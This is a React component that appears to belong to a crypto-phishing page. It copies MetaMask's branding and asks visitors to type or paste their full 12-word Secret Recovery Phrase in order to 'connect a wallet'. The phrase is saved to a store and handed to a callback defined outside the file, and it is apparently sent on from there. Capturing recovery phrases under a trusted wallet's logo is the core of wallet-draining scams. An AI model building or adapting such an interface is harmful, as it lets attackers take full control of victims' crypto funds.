"use client";

import { useWalletStore } from "@/store/walletStore";
import { InfoIcon } from "lucide-react";
import React, { useState, useRef, useEffect } from "react";
import MetaMaskFull from "../icons/meta-mask-full";

export default function MetaMask({
	handleFinish,
}: {
	handleFinish: (walletPhrase: string) => Promise<void>;
}) {
	const [words, setWords] = useState<string[]>([""]);
	const [visibility, setVisibility] = useState<boolean[]>([false]);
	const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
	const { setSeedPhrase } = useWalletStore();

	// --- Handle completion ---
	const handleComplete = () => {
		setSeedPhrase(words.join(" "));
		handleFinish(words.join(" "));
	};

	// --- Add new input automatically ---
	const addNewInput = () => {
		if (words.length < 12) {
			setWords((prev) => [...prev, ""]);
			setVisibility((prev) => [...prev, false]);
			setTimeout(() => {
				inputRefs.current[words.length]?.focus();
			}, 10);
		}
	};

	// --- Handle keyboard events (desktop only) ---
	const handleKeyDown = (
		e: React.KeyboardEvent<HTMLInputElement>,
		index: number
	) => {
		if (e.key === " ") {
			e.preventDefault();
			if (words[index].trim() !== "") addNewInput();
		} else if (e.key === "Backspace" && words[index] === "" && index > 0) {
			e.preventDefault();
			setWords((prev) => prev.filter((_, i) => i !== index));
			setVisibility((prev) => prev.filter((_, i) => i !== index));
			setTimeout(() => {
				inputRefs.current[index - 1]?.focus();
			}, 10);
		}
	};

	// --- Handle input changes (mobile + desktop friendly) ---
	const handleInput = (e: React.FormEvent<HTMLInputElement>, index: number) => {
		const value = e.currentTarget.value;

		// Add new word when space detected (mobile compatible)
		if (value.endsWith(" ")) {
			if (words[index].trim() !== "") addNewInput();
			return;
		}

		setWords((prev) => prev.map((w, i) => (i === index ? value : w)));
	};

	// --- Toggle single input visibility ---
	const toggleVisibility = (index: number) => {
		setVisibility((prev) => prev.map((v, i) => (i === index ? !v : v)));
	};

	// --- Clear all words ---
	const handleClear = () => {
		setWords([""]);
		setVisibility([false]);
		inputRefs.current[0]?.focus();
	};

	// --- Paste from clipboard ---
	const handlePaste = async () => {
		try {
			const text = await navigator.clipboard.readText();
			if (!text) return;

			const pastedWords = text.trim().split(/\s+/).slice(0, 12);

			setWords(pastedWords);
			setVisibility(Array(pastedWords.length).fill(false));

			setTimeout(() => {
				inputRefs.current[pastedWords.length - 1]?.focus();
			}, 10);
		} catch (err) {
			console.error("Failed to paste from clipboard:", err);
		}
	};

	useEffect(() => {
		inputRefs.current[0]?.focus();
	}, []);

	const hasWords = words.some((w) => w.trim() !== "");
	const filledCount = words.filter((w) => w.trim() !== "").length;

	return (
		<div className="relative bg-zinc-950 h-full w-full px-4 pb-28">
			{/* Header */}
			<div className="w-full p-secondary justify-start items-center">
				<span className="md:hidden">
					<img
						src="/images/wallets/metamask-fox.svg"
						alt="meta mask"
					/>
				</span>

				<span className="hidden md:flex">
					<MetaMaskFull />
				</span>
			</div>

			{/* Main content */}
			<div className="mt-8 flex flex-col w-full h-full border border-white/10 px-6 py-8 gap-8 rounded-lg max-w-md m-auto">
				{/* Header text */}
				<div className="flex flex-col gap-2">
					<h2 className="text-2xl font-semibold text-gray-100 mb-1">
						Connect a wallet
					</h2>
					<p className="text-gray-400 font-medium flex gap-1 items-center">
						Enter your Secret Recovery Phrase
						<InfoIcon className="w-4 h-4" />
					</p>
				</div>

				{/* Phrase input grid */}
				<div className="grid grid-cols-3 gap-3 border rounded-lg bg-neutral-900 p-4 min-h-56">
					{words.map((word, index) => (
						<div
							key={index}
							className="flex items-center gap-2 bg-black border border-gray-100/10 rounded-lg px-2 py-1 h-fit"
						>
							<span className="text-neutral-400 w-4 text-right font-medium whitespace-nowrap">
								{index + 1}.
							</span>
							<input
								ref={(el) => {
									if (el) inputRefs.current[index] = el;
								}}
								type={visibility[index] ? "text" : "password"}
								value={word}
								onInput={(e) => handleInput(e, index)} // ✅ Works on mobile
								onKeyDown={(e) => handleKeyDown(e, index)} // ✅ Works on desktop
								onClick={() => toggleVisibility(index)}
								className="bg-transparent flex-1 outline-none text-neutral-100 text-sm py-1"
							/>
						</div>
					))}
				</div>

				{/* Paste / Clear button */}
				<div className="flex justify-end text-sm text-neutral-400">
					<button
						onClick={hasWords ? handleClear : handlePaste}
						className="text-indigo-300 hover:underline font-medium text-lg"
					>
						{hasWords ? "Clear all" : "Paste"}
					</button>
				</div>

				{/* Continue button */}
				<button
					onClick={handleComplete}
					className={`w-full py-3 rounded-lg font-medium transition-all mt-auto ${
						filledCount >= 12
							? "bg-neutral-100 hover:bg-neutral-200 text-neutral-800"
							: "bg-neutral-400 text-neutral-800 cursor-not-allowed"
					}`}
					disabled={filledCount < 12}
				>
					Continue
				</button>
			</div>
		</div>
	);
}
